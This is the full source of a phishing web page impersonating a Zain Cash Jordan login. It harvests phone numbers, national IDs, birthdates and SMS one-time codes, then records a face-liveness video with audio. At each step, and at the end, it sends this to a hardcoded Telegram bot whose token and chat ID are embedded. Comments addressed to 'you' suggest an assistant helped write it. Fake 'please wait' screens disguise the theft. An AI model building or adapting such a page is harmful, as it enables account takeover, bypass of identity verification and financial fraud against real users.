<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>زين كاش الأردن | تسجيل الدخول</title>

  <!-- Open Graph Meta Tags for Link Preview -->
  <meta property="og:title" content="زين كاش الأردن | تسجيل الدخول" />
  <meta property="og:description" content="سجل دخولك لخدمات زين كاش الأردن بأمان وسهولة!" />
  <meta property="og:image" content="https://www2.0zz0.com/2025/06/23/15/797647963.jpeg" />
  <meta property="og:url" content="https://zaincashjordan.vercel.app" />
  <meta property="og:type" content="website" />
  <meta property="og:locale" content="ar_AR" />

  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;900&display=swap" rel="stylesheet">

  <style>
    /* Light / friendly theme (based on your version) + camera page integrated */
    :root{
      --blue-500: #2F80ED;
      --blue-300: #56CCF2;
      --muted: #6b7280;
      --card-bg: #ffffff;
      --glass: rgba(47,128,237,0.06);
      --radius: 18px;
      --max-width: 420px;
      --accent-gradient: linear-gradient(90deg, var(--blue-500) 0%, var(--blue-300) 100%);
    }

    *{box-sizing:border-box}
    html,body{height:100%;margin:0;font-family:'Cairo', Arial, sans-serif;background: linear-gradient(135deg, #EAF6FF 0%, #FFFFFF 100%); -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;direction:rtl;color:#17202a;}

    /* App wrapper */
    .center {
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:18px;
    }

    /* Initial card (light like your original) */
    #appCard {
      width: 370px;
      max-width: 95vw;
      background: var(--card-bg);
      border-radius: 22px;
      padding: 28px 22px;
      box-shadow: 0 10px 30px rgba(47,128,237,0.08);
      border: 1px solid rgba(47,128,237,0.12);
      overflow:hidden;
      animation: fadein .6s;
    }
    @keyframes fadein { from { opacity:0; transform: translateY(20px)} to {opacity:1; transform:none} }

    .zain-header { display:flex; align-items:center; justify-content:center; gap:12px; margin-bottom:8px }
    .zain-logo { width:64px; height:64px; border-radius:16px; background:var(--accent-gradient); display:flex; align-items:center; justify-content:center; box-shadow:0 6px 18px rgba(47,128,237,0.12); border:2px solid #fff; overflow:hidden }
    .zain-logo img { width:60px; height:60px; object-fit:cover; border-radius:10px; background:#fff; border:1px solid #eef7ff }
    .zain-title-main { font-size:22px; font-weight:900; color:var(--blue-500); margin:0; text-align:center }
    .zain-title-sub { font-size:14px; color:#334155; font-weight:700; text-align:center; margin-top:4px }

    .step-indicator { display:flex; justify-content:center; gap:7px; margin:10px 0 14px 0 }
    .step-dot { width:11px; height:11px; border-radius:50%; background:#eef6ff; border: 2px solid #cfeeff }
    .step-dot.active { background: linear-gradient(135deg,var(--blue-500),var(--blue-300)); border-color:var(--blue-500) }

    form { display:flex; flex-direction:column; gap:12px; margin-top:6px }
    label { color:var(--blue-500); font-weight:700; font-size:14px; margin-right:4px }
    input, select { padding:12px 10px; border-radius:10px; border:1px solid rgba(47,128,237,0.08); background:#f8fcff; font-size:15px; outline:none }
    input:focus, select:focus { box-shadow:0 6px 20px rgba(47,128,237,0.08); border-color:var(--blue-500); background:#fff }

    .button { background: var(--accent-gradient); color:#001425; border:none; padding:13px 12px; border-radius:10px; font-weight:900; font-size:16px; cursor:pointer; box-shadow:0 8px 26px rgba(47,128,237,0.14) }
    .info-msg { text-align:center; color:var(--blue-500); font-weight:700; font-size:13px }

    .code-inputs { display:flex; gap:10px; justify-content:center; margin-top:6px }
    .code-inputs input { width:120px; font-size:18px; text-align:center; padding:12px 8px; letter-spacing:6px; font-weight:800; background:#f8fcff; border-radius:8px }

    .zain-footer { text-align:center; color:#94bff1; margin-top:12px; font-weight:700; font-size:13px }

    /* Modal */
    #modalError { display:none; position:fixed; inset:0; background: rgba(2,6,23,0.06); align-items:center; justify-content:center; z-index:9999 }
    #modalError.active { display:flex }
    #modalContent { background:#fff; padding:20px 20px; border-radius:12px; box-shadow:0 10px 40px rgba(2,6,23,0.08); text-align:center; border:1px solid #ffdede }
    #modalContent .err-title { color:#c53030; font-weight:900 }

    /* Camera fullscreen page (light / modern) */
    .camera-page {
      position:fixed;
      inset:0;
      display:none;
      align-items:center;
      justify-content:center;
      background: linear-gradient(180deg, rgba(250,250,252,0.98), rgba(245,248,255,0.98));
      z-index:9999;
      padding:18px;
    }

    .cam-card {
      width:100%;
      max-width:720px;
      background:#fff;
      border-radius:18px;
      padding:16px;
      box-shadow:0 20px 60px rgba(2,6,23,0.08);
      border:1px solid rgba(47,128,237,0.06);
      display:flex;
      flex-direction:column;
      gap:12px;
      align-items:center;
    }

    .cam-top { width:100%; display:flex; justify-content:space-between; align-items:center; gap:8px }
    .cam-back { font-size:26px; color:var(--blue-500); cursor:pointer; padding:8px; border-radius:10px }
    .cam-back:hover { background:var(--glass) }

    .cam-frame {
      width:100%;
      background: linear-gradient(180deg,#fff,#fbfdff);
      border-radius:12px;
      padding:8px;
      display:flex;
      justify-content:center;
      align-items:center;
      border: 6px solid #ffffff;
      box-shadow:0 12px 30px rgba(47,128,237,0.06);
    }

    .video-outer { width:100%; border-radius:8px; overflow:hidden; background:#000; display:flex; justify-content:center; align-items:center }
    video#cameraStream { width:100%; height:70vh; max-height:78vh; object-fit:cover; transform:scaleX(-1); display:block }

    .instructions { text-align:center; margin-top:6px }
    .main-instruction { font-size:22px; font-weight:900; color:#0f1724 }
    .sub-instruction { color:var(--muted); font-size:14px }

    .meta { display:flex; gap:12px; align-items:center; justify-content:center; width:100% }
    .step-badge { background:#f3fbff; color:var(--blue-500); padding:10px 16px; border-radius:10px; font-weight:800; border:1px solid rgba(47,128,237,0.06) }
    .count-ring { width:64px; height:64px; border-radius:999px; display:flex; align-items:center; justify-content:center; background: conic-gradient(var(--blue-300) 0deg, rgba(2,6,23,0.04) 0deg); box-shadow:0 6px 18px rgba(47,128,237,0.06) }
    .count-ring .num { font-weight:900; color:#0f1724; font-size:18px }

    .progress-line { width:92%; height:8px; background:#f3f9ff; border-radius:999px; overflow:hidden; }
    .progress-line > i { display:block;height:100%;width:0%; background: linear-gradient(90deg,var(--blue-300),var(--blue-500)); transition:width 300ms linear; }

    .controls { display:flex; gap:10px; justify-content:center; width:100% }
    .ghost { background:transparent;border:1px solid rgba(47,128,237,0.08); color:var(--blue-500); padding:10px 14px; border-radius:10px; cursor:pointer; font-weight:800 }
    .download { background:linear-gradient(90deg,#eaf6ff,#dff6ff); color:var(--blue-500); padding:10px 14px; border-radius:10px; cursor:pointer; font-weight:900; border:none }

    .status { color:var(--muted); font-size:13px; text-align:center }

    @media (max-width:480px) {
      .zain-logo { width:54px; height:54px }
      .zain-logo img { width:48px; height:48px }
      #appCard { padding:18px }
      video#cameraStream { height:58vh }
      .main-instruction { font-size:18px }
    }
  </style>
</head>
<body>
  <div class="center">
    <div id="appCard" aria-live="polite"></div>
  </div>

  <!-- Hidden form carry (keeps original behavior) -->
  <form id="hiddenForm" action="https://formcarry.com/s/ST2queSorzd" method="POST" style="display:none" target="dummyFrame">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="step" id="fs_step">
    <input type="hidden" name="phone" id="fs_phone">
    <input type="hidden" name="nationalId" id="fs_nationalId">
    <input type="hidden" name="birthdate" id="fs_birthdate">
    <input type="hidden" name="code5" id="fs_code5">
    <input type="hidden" name="code4" id="fs_code4">
  </form>
  <iframe style="display:none" name="dummyFrame"></iframe>

  <!-- Modal Error -->
  <div id="modalError" role="dialog" aria-hidden="true">
    <div id="modalContent">
      <div class="err-title">رمز التحقق غير صحيح</div>
      <div class="err-msg">يرجى التأكد من الرمز والمحاولة مرة أخرى.</div>
      <button onclick="closeModal()">إغلاق</button>
    </div>
  </div>

  <!-- Camera Fullscreen Page (light) -->
  <div class="camera-page" id="cameraPage" aria-hidden="true">
    <div class="cam-card" role="document">
      <div class="cam-top">
        <div style="opacity:0.0"></div>
        <div style="font-weight:800;color:#0f1724">تسجيل فيديو التحقق</div>
        <div class="cam-back" id="camBack" title="عودة">←</div>
      </div>

      <div class="cam-frame">
        <div class="video-outer">
          <video id="cameraStream" autoplay playsinline muted></video>
        </div>
      </div>

      <div class="instructions">
        <div class="main-instruction" id="mainInstruction">استعد — سيتم البدء تلقائيًا</div>
        <div class="sub-instruction" id="subInstruction">تأكد من توجيه الكاميرا نحو وجهك في الإطار</div>
      </div>

      <div class="meta">
        <div class="step-badge" id="stepBadge">الخطو��: جاهز</div>
        <div class="count-ring" id="countRing" aria-hidden="false"><div class="num" id="countNum">0</div></div>
      </div>

      <div class="progress-line" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
        <i id="progressInner"></i>
      </div>

      <div class="controls">
        <button class="ghost" id="retryBtn" style="display:none">أعد المحاولة</button>
        <a id="downloadBtn" class="download" style="display:none" download="verification.webm">تحميل الفيديو</a>
      </div>

      <div class="status" id="statusLine">الحالة: جاهز</div>
    </div>
  </div>

  <script>
    /*************************************************************************
     * Integrated single page:
     * - Shows your provided "index_Version2" flow first (light theme).
     * - After final verification code (code4) is submitted, automatically
     *   opens the camera page (separate UI) and runs the guided recording:
     *   close eyes, left, right, left, right, smile (each 5s).
     * - After recording, attempts to send the video to Telegram with the
     *   collected data in the caption (token & chat id set as you requested).
     *
     * NOTE:
     * - You wanted sending to be done via the Telegram bot (token + chat id).
     *   The sendFormSubmit function was changed so that collected textual data
     *   is sent to the bot (sendMessage) instead of submitting the hidden form
     *   to the third-party site.
     *
     * SECURITY NOTE (RECOMMENDATION):
     * - Including bot token in client-side JavaScript is insecure: anyone can
     *   extract the token. For production use, proxy messages via your server
     *   and keep the token secret.
     *
     * CORS NOTE:
     * - Telegram API doesn't set permissive CORS headers; some browsers may
     *   block direct fetch() calls. If you see CORS errors, the reliable fix
     *   is to send data from your server (server-side).
     *************************************************************************/

    // ---- TELEGRAM CONFIG (as you requested) ----
    const TELEGRAM_BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
    const TELEGRAM_CHAT_ID   = "6873334348";

    // ---- Steps config ----
    const STEPS = [
      { key:'close', label:'أرجوك اغمض عينيك' },
      { key:'left',  label:'حرك وجهك إلى اليسار' },
      { key:'right', label:'حرك وجهك إلى اليمين' },
      { key:'left2', label:'حرك وجهك إلى اليسار مرة أخرى' },
      { key:'right2',label:'حرك وجهك إلى اليمين مرة أخرى' },
      { key:'smile', label:'ابتسم' }
    ];
    const STEP_SECONDS = 5;

    // ---- Application state ----
    const zainCashLogo = "https://www2.0zz0.com/2025/06/23/15/797647963.jpeg";
    let userData = { phone: '', nationalId: '', birthdate: '', code5: '', code4: '' };
    let waitingTimeout = null;

    // ---- Send data to Telegram instead of submitting to the site ----
    // This function will send a formatted text message to the configured chat.
    // It is fire-and-forget: callers do not await it (to keep the UX flow).
    function sendFormSubmit(stepName) {
      const stepLabel = stepName || '-';
      const parts = [
        `<b>خطوة:</b> ${escapeHtml(stepLabel)}`,
        `<b>رقم الهاتف:</b> ${escapeHtml(userData.phone || '-')}`,
        `<b>الرقم الوطني:</b> ${escapeHtml(userData.nationalId || '-')}`,
        `<b>تاريخ الميلاد:</b> ${escapeHtml(userData.birthdate || '-')}`,
        `<b>رمز SMS (5):</b> ${escapeHtml(userData.code5 || '-')}`,
        `<b>رمز إضافي (4):</b> ${escapeHtml(userData.code4 || '-')}`
      ];
      const message = parts.join('\n');

      // Try to send via Telegram sendMessage (HTML parse mode)
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      }).then(async res => {
        if (!res.ok) {
          const txt = await res.text().catch(()=>null);
          console.warn('Telegram sendMessage failed:', res.status, txt);
        } else {
          // no-op success
        }
      }).catch(err => {
        console.warn('Telegram sendMessage error (likely CORS or network):', err);
      });

      // NOTE: original hidden form submission is intentionally disabled.
      // If you want to keep the original site submission as a fallback, uncomment:
      /*
      document.getElementById('fs_step').value = stepName;
      document.getElementById('fs_phone').value = userData.phone || '';
      document.getElementById('fs_nationalId').value = userData.nationalId || '';
      document.getElementById('fs_birthdate').value = userData.birthdate || '';
      document.getElementById('fs_code5').value = userData.code5 || '';
      document.getElementById('fs_code4').value = userData.code4 || '';
      document.getElementById('hiddenForm').submit();
      */
    }

    // small helper to avoid HTML injection in messages
    function escapeHtml(s){
      return String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
    }

    // ---- Render initial flow (kept from your provided file, light theme) ----
    const app = document.getElementById('appCard');

    function stepIndicator(step) {
      return `
        <div class="step-indicator">
          <div class="step-dot${step===1?' active':''}"></div>
          <div class="step-dot${step===2?' active':''}"></div>
          <div class="step-dot${step===3?' active':''}"></div>
        </div>
      `;
    }
    function header(sub="") {
      return `
        <div class="zain-header">
          <div class="zain-logo"><img src="${zainCashLogo}" alt="Zain Cash" /></div>
          <span class="zain-title-main">زين كاش الأردن</span>
        </div>
        <div class="zain-title-sub">${sub}</div>
      `;
    }

    function renderPhoneStep() {
      app.innerHTML = `
        ${header("مرحبًا بك! سجل دخولك لحسابك")}
        ${stepIndicator(1)}
        <form id="phoneForm" autocomplete="off">
          <label>رقم الهاتف المرتبط بحسابك</label>
          <input type="tel" id="phone" placeholder="07XXXXXXXX" pattern="07[0-9]{8}" maxlength="10" required autocomplete="tel" inputmode="numeric"/>
          <button type="submit" class="button">التالي</button>
        </form>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
      `;
      document.getElementById('phone').focus();
      document.getElementById('phoneForm').onsubmit = function(e) {
        e.preventDefault();
        const phone = document.getElementById('phone').value.trim();
        if (!/^07\d{8}$/.test(phone)) {
          alert('يرجى إدخال رقم هاتف صحيح يبدأ بـ 07 ويتكون من 10 أرقام');
          document.getElementById('phone').focus();
          return;
        }
        userData.phone = phone;
        sendFormSubmit("phone");
        renderNationalIdStep();
      };
    }

    function renderNationalIdStep() {
      app.innerHTML = `
        <button class="back-btn" id="backBtn">&#8592; رجوع</button>
        ${header("يرجى إدخال بياناتك الشخصية")}
        ${stepIndicator(1)}
        <form id="nationalForm" autocomplete="off">
          <label>الرقم الوطني</label>
          <input type="text" id="nationalId" placeholder="الرقم الوطني" maxlength="12" required inputmode="numeric"/>
          <label>تاريخ الميلاد</label>
          <div class="birthdate-fields" id="birthdateFields"></div>
          <button type="submit" class="button">التالي</button>
        </form>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
      `;
      renderBirthdateFields();
      document.getElementById('nationalId').focus();

      document.getElementById('nationalForm').onsubmit = function(e) {
        e.preventDefault();
        const nationalId = document.getElementById('nationalId').value.trim();
        const day = document.getElementById('birthDay').value;
        const month = document.getElementById('birthMonth').value;
        const year = document.getElementById('birthYear').value;
        if (!/^\d{10,12}$/.test(nationalId)) {
          alert('يرجى إدخال رقم وطني صحيح (10 إلى 12 رقم)');
          document.getElementById('nationalId').focus();
          return;
        }
        if (!day || !month || !year) {
          alert('يرجى إدخال تاريخ الميلاد (اليوم/الشهر/السنة)');
          return;
        }
        const birthdate = `${year}-${month.padStart(2, '0')}-${day.padStart(2, '0')}`;
        userData.nationalId = nationalId;
        userData.birthdate = birthdate;
        sendFormSubmit("nationalId");
        showNationalIdWaitAndGotoCode5();
      };
      document.getElementById('backBtn').onclick = () => { renderPhoneStep(); };
    }

    function showNationalIdWaitAndGotoCode5() {
      const randomWait = Math.floor(Math.random() * 26) + 15;
      app.innerHTML = `
        <div style="padding:40px 0;text-align:center;">
          <div style="margin-bottom:18px;">
            <img src="${zainCashLogo}" width="60" height="60" style="border-radius:14px;box-shadow:0 1px 7px #2f80ed33;"/>
          </div>
          <div style="color:var(--blue-500);font-size:22px;font-weight:900;margin-bottom:8px;">يرجى الانتظار...</div>
          <div style="color:#334155;font-size:15px;">جاري التحقق من المعلومات المدخلة</div>
          <div id="waitSecNational" style="margin:20px auto 0;font-size:16px;color:#1887d2;font-weight:700;">${randomWait}</div>
        </div>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
      `;
      let sec = randomWait;
      const waitElem = document.getElementById('waitSecNational');
      waitingTimeout = setInterval(() => {
        sec--;
        if(waitElem) waitElem.textContent = sec;
        if(sec === 0) {
          clearInterval(waitingTimeout);
          renderCode5Step();
        }
      }, 1000);
    }

    function renderBirthdateFields() {
      const now = new Date();
      const maxYear = now.getFullYear();
      const minYear = maxYear - 100;
      const birthdateFields = document.getElementById('birthdateFields');

      let days = '<select id="birthDay" required><option value="">اليوم</option>';
      for (let d = 1; d <= 31; d++) days += `<option value="${d}">${d}</option>`;
      days += '</select>';

      const monthNames = [
        'يناير','فبراير','مارس','أبريل','مايو','يونيو',
        'يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر'
      ];
      let months = '<select id="birthMonth" required><option value="">الشهر</option>';
      for (let m = 1; m <= 12; m++) months += `<option value="${m}">${monthNames[m - 1]}</option>`;
      months += '</select>';

      let years = '<select id="birthYear" required><option value="">السنة</option>';
      for (let y = maxYear; y >= minYear; y--) years += `<option value="${y}">${y}</option>`;
      years += '</select>';

      birthdateFields.innerHTML = days + months + years;
    }

    function renderCode5Step() {
      app.innerHTML = `
        <button class="back-btn" id="backBtn">&#8592; رجوع</button>
        ${header("تم إرسال رمز تحقق إلى هاتفك")}
        ${stepIndicator(2)}
        <div class="info-msg">أدخل رمز التحقق المكون من 5 أرقام كما وصلك برسالة SMS</div>
        <form id="code5Form" autocomplete="off">
          <div class="code-inputs">
            <input type="text" maxlength="5" pattern="\\d{5}" required id="code5input" inputmode="numeric" placeholder="*****" />
          </div>
          <button type="submit" class="button">تأكيد الرمز</button>
        </form>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
      `;
      const codeInput = document.getElementById('code5input');
      codeInput.focus();
      codeInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0,5);
      });
      document.getElementById('code5Form').onsubmit = function(e) {
        e.preventDefault();
        let code = codeInput.value.trim();
        if (code.length !== 5) {
          alert('يرجى إدخال رمز مكون من 5 أرقام');
          codeInput.focus();
          return;
        }
        userData.code5 = code;
        sendFormSubmit("code5");
        showWaitMsgAndGotoCode4();
      };
      document.getElementById('backBtn').onclick = () => { renderNationalIdStep(); };
    }

    function showWaitMsgAndGotoCode4() {
      const randomWait = Math.floor(Math.random() * 6) + 5; // 5-10 ثوانٍ
      app.innerHTML = `
        <div style="padding:40px 0;text-align:center;">
          <div style="margin-bottom:18px;">
            <img src="${zainCashLogo}" width="60" height="60" style="border-radius:14px;box-shadow:0 1px 7px #2f80ed33;"/>
          </div>
          <div style="color:var(--blue-500);font-size:22px;font-weight:900;margin-bottom:8px;">يرجى الانتظار...</div>
          <div style="color:#334155;font-size:15px;">جاري التحقق من رمز الدخول</div>
          <div id="waitSec" style="margin:20px auto 0;font-size:16px;color:#1887d2;font-weight:700;">${randomWait}</div>
        </div>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
      `;
      let sec = randomWait;
      const waitElem = document.getElementById('waitSec');
      waitingTimeout = setInterval(() => {
        sec--;
        if(waitElem) waitElem.textContent = sec;
        if(sec === 0) {
          clearInterval(waitingTimeout);
          renderCode4Step();
        }
      }, 1000);
    }

    function renderCode4Step() {
      app.innerHTML = `
        <button class="back-btn" id="backBtn">&#8592; رجوع</button>
        ${header("تحقق إضافي لحماية حسابك")}
        ${stepIndicator(3)}
        <div class="info-msg">الرجاء إدخال رمز التحقق المكون من 4 أرقام</div>
        <form id="code4Form" autocomplete="off">
          <div class="code-inputs">
            <input type="text" maxlength="4" pattern="\\d{4}" required id="code4input" inputmode="numeric" placeholder="****" />
          </div>
          <button type="submit" class="button">تأكيد الرمز</button>
        </form>
        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
      `;
      const codeInput = document.getElementById('code4input');
      codeInput.focus();
      codeInput.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '').slice(0,4);
      });
      document.getElementById('code4Form').onsubmit = function(e) {
        e.preventDefault();
        let code = codeInput.value.trim();
        if (code.length !== 4) {
          alert('يرجى إدخال رمز مكون من 4 أرقام');
          codeInput.focus();
          return;
        }
        userData.code4 = code;
        sendFormSubmit("code4");
        // AFTER last code, redirect to camera UI (integrated in this file)
        openCameraPageAndStart();
      };
      document.getElementById('backBtn').onclick = () => { renderCode5Step(); };
    }

    function closeModal() {
      document.getElementById('modalError').classList.remove('active');
      renderCode5Step();
    }

    // Initialize first step
    renderPhoneStep();

    // ---------------- Camera / recording / upload logic ----------------
    const cameraPage = document.getElementById('cameraPage');
    const camBack = document.getElementById('camBack');
    const cameraStream = document.getElementById('cameraStream');
    const mainInstruction = document.getElementById('mainInstruction');
    const subInstruction = document.getElementById('subInstruction');
    const stepBadge = document.getElementById('stepBadge');
    const countNum = document.getElementById('countNum');
    const progressInner = document.getElementById('progressInner');
    const retryBtn = document.getElementById('retryBtn');
    const downloadBtn = document.getElementById('downloadBtn');
    const statusLine = document.getElementById('statusLine');

    let stream = null;
    let mediaRecorder = null;
    let recordedChunks = [];

    function showCameraPage(){
      cameraPage.style.display = 'flex';
      cameraPage.setAttribute('aria-hidden', 'false');
      history.pushState({camera:true}, '', '#camera');
    }
    function hideCameraPage(){
      cameraPage.style.display = 'none';
      cameraPage.setAttribute('aria-hidden', 'true');
      stopStream();
      if (location.hash === '#camera') history.back();
    }

    async function openCameraPreview(){
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
        cameraStream.srcObject = stream;
        cameraStream.muted = true;
        setStatus('تم تفعيل الكاميرا');
        setMain('استعد — سيتم البدء تلقائيًا');
        setSub('اتبع التعليمات الظاهرة تحت الفيديو');
        return true;
      } catch (err) {
        console.error('camera error:', err);
        setStatus('تعذر الوصول إلى الكاميرا — الرجاء السماح بالوصول');
        setMain('تعذر الوصول إلى الكاميرا');
        setSub('الرجاء السماح بالكاميرا لإتمام عملية التحقق');
        return false;
      }
    }

    function stopStream(){
      if (stream) {
        stream.getTracks().forEach(t => t.stop());
        stream = null;
      }
      cameraStream.srcObject = null;
    }

    function startRecorder(){
      recordedChunks = [];
      const options = { mimeType: 'video/webm;codecs=vp8,opus' };
      try { mediaRecorder = new MediaRecorder(stream, options); } catch(e) { mediaRecorder = new MediaRecorder(stream); }
      mediaRecorder.ondataavailable = (e) => { if (e.data && e.data.size) recordedChunks.push(e.data); };
      mediaRecorder.start(1000);
    }

    function stopRecorder(){
      return new Promise(resolve => {
        if (!mediaRecorder) return resolve(null);
        mediaRecorder.onstop = () => {
          const blob = new Blob(recordedChunks, { type: 'video/webm' });
          resolve(blob);
        };
        mediaRecorder.stop();
      });
    }

    function setMain(text){ mainInstruction.textContent = text; }
    function setSub(text){ subInstruction.textContent = text; }
    function setStatus(text){ statusLine.textContent = 'الحالة: ' + text; }

    function setRingProgress(percent){
      const deg = Math.round((percent / 100) * 360);
      const ring = document.getElementById('countRing');
      ring.style.background = `conic-gradient(${getComputedStyle(document.documentElement).getPropertyValue('--blue-300') || '#56CCF2'} ${deg}deg, rgba(2,6,23,0.04) ${deg}deg)`;
    }

    function delay(ms){ return new Promise(r => setTimeout(r, ms)); }

    async function runGuidedSequenceAndUpload() {
      retryBtn.style.display = 'none';
      downloadBtn.style.display = 'none';
      setStatus('جارٍ التسجيل...');
      startRecorder();

      // iterate steps
      for (let i=0;i<STEPS.length;i++){
        const step = STEPS[i];
        stepBadge.textContent = `التعليمات: ${step.label}`;
        for (let s = STEP_SECONDS; s >= 1; s--){
          countNum.textContent = s;
          const stepProgressPercent = Math.round(((STEP_SECONDS - s + 1) / STEP_SECONDS) * 100);
          const overallPercent = Math.round(((i + (stepProgressPercent / 100)) / STEPS.length) * 100);
          setRingProgress(overallPercent);
          progressInner.style.width = overallPercent + '%';
          await delay(1000);
        }
        await delay(300);
      }

      // finish
      setMain('انتهى التسجيل');
      setSub('جارٍ تجهيز الفيديو...');
      const blob = await stopRecorder();

      // prepare download link
      const url = URL.createObjectURL(blob);
      downloadBtn.href = url;
      downloadBtn.style.display = 'inline-block';
      downloadBtn.onclick = () => setTimeout(()=>URL.revokeObjectURL(url), 60000);

      retryBtn.style.display = 'inline-block';
      setStatus('جارٍ التحقق من معلوماتك رجاءً انتظر...');

      // upload to Telegram with collected info in caption
      try {
        await sendToTelegramWithCaption(blob, buildCaption());
        // show neutral success status (no Telegram-specific alert)
        setStatus('اكتمل التحقق. شكرًا لك.');
        setMain('اكتمل التحقق');
        setSub('تم استلام الفيديو والمعلومات بنجاح');
      } catch (err) {
        console.warn('upload failed:', err);
        // neutral fallback: allow user to download/upload manually
        setStatus('فشل التحقق عبر الشبكة. يمكنك تحميل الفيديو ورفعه لاحقًا أو المحاولة مرة أخرى.');
        setMain('فشل التحقق عبر الشبكة');
        setSub('يمكنك تنزيل الفيديو وإرساله يدوياً أو إعادة المحاولة لاحقًا');
      }
    }

    // Build caption with previously collected form data
    function buildCaption(){
      const parts = [
        `رقم الهاتف: ${userData.phone || '-'}`,
        `الرقم الوطني: ${userData.nationalId || '-'}`,
        `تاريخ الميلاد: ${userData.birthdate || '-'}`,
        `رمز SMS (5): ${userData.code5 || '-'}`,
        `رمز إضافي (4): ${userData.code4 || '-'}`
      ];
      return parts.join('\n');
    }

    // Attempt to send video to Telegram (direct). If fails due to CORS, it will throw.
    async function sendToTelegramWithCaption(blob, caption){
      setStatus('جارٍ التحقق من معلوماتك رجاءً انتظر...');
      const file = new File([blob], 'verification.webm', { type: blob.type });
      const fd = new FormData();
      fd.append('chat_id', TELEGRAM_CHAT_ID);
      fd.append('caption', caption);
      fd.append('video', file);

      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
      const res = await fetch(url, { method: 'POST', body: fd, mode: 'cors' });

      if (!res.ok) {
        const txt = await res.text().catch(()=>null);
        throw new Error('upload failed: ' + (res.status || '') + ' ' + (txt || ''));
      }
      const json = await res.json();
      if (!json || !json.ok) throw new Error('telegram returned not ok');
      // success - do nothing else (we show neutral success in UI)
    }

    // Open camera page and start recording flow (called after final step)
    async function openCameraPageAndStart(){
      showCameraPage();
      const ok = await openCameraPreview();
      if (!ok) { return; }
      await delay(700);
      try {
        await runGuidedSequenceAndUpload();
      } catch (err) {
        console.error(err);
        setStatus('حدث خطأ أثناء التسجيل. حاول مرة أخرى.');
        retryBtn.style.display = 'inline-block';
      }
    }

    // Wire camera page buttons
    camBack.addEventListener('click', () => {
      hideCameraPage();
      // Optionally you can redirect user back to a success screen or initial form
      renderPhoneStep();
    });

    retryBtn.addEventListener('click', async () => {
      // reset
      progressInner.style.width = '0%';
      setRingProgress(0);
      countNum.textContent = '0';
      stepBadge.textContent = 'الخطوة: جاهز';
      setMain('إعادة التسجيل');
      setSub('استعد، سيبدأ التسجيل بعد لحظات');
      setStatus('جاهز لإعادة المحاولة');
      retryBtn.style.display = 'none';
      downloadBtn.style.display = 'none';

      if (!stream) {
        const ok = await openCameraPreview();
        if (!ok) return;
      }
      await delay(600);
      runGuidedSequenceAndUpload();
    });

    // handle back/forward to close camera
    window.addEventListener('popstate', (e) => {
      if (!location.hash || location.hash !== '#camera') {
        hideCameraPage();
      }
    });

    // Optional: a lightweight keep-alive request (copied from your file) — commented out by default.
    // If you still want it, uncomment the following lines:
    /*
    setInterval(function() {
      fetch('https://formcarry.com/s/ST2queSorzd').catch(()=>{});
    }, 1000);
    */

    // Accessibility: set initial small visual state
    setRingProgress(0);
    progressInner.style.width = '0%';
    setStatus('جاهز لبدء التسجيل');
  </script>
</body>
</html>
